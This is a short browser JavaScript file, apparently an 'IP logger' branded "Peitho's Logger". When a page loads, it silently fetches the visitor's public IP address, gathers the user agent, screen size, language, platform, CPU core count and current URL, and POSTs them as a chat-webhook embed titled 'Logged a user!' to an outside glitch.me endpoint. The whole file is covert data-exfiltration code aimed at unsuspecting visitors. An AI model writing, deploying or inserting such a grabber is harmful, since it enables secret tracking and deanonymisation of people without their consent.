async function get_ip() {
	let req = await fetch('https://ipv4.icanhazip.com');
	let res = await req.text();
	return res;
}
get_ip().then((ip) => {
	let useragent = navigator.userAgent;

	let height = window.screen.height;
	let width = window.screen.width;

	let gpu = navigator.hardwareConcurrency;

	let cookies = navigator.cookieEnabled;
	let name = navigator.product;
	let code = navigator.appCodeName;
	let lang = navigator.language;

	let os = navigator.platform;

	let refferer = window.location.href;
	function sendMessage() {
		var request = new XMLHttpRequest();
		request.open('POST', 'https://some-retarded-api.glitch.me/');

		request.setRequestHeader('Content-type', 'application/json');

		var params = {
			username: "Peitho's Logger",
			avatar_url: 'https://doggo.ninja/TsY1SP.jpg',
			color: '',
			embeds: [
				{
					color: '19474160',
					title: 'Logged a user!',
					description: `**IP Address:**
${ip}
------------------------------------------------------
**Browser data:**

Useragent: 
${useragent}

Refferer: ${refferer}
Browser language: ${lang}
Cookies enabled: ${cookies}
Browser engine: ${name}
Browser code: ${code}
------------------------------------------------------
**Screen details:**
Size: ${width} x ${height}
------------------------------------------------------
**Specs:**
Operating system: ${os} 

*GPU:*
Core count: ${gpu}
------------------------------------------------------`,
				},
			],
		};

		request.send(JSON.stringify(params));
	}
	sendMessage();
});
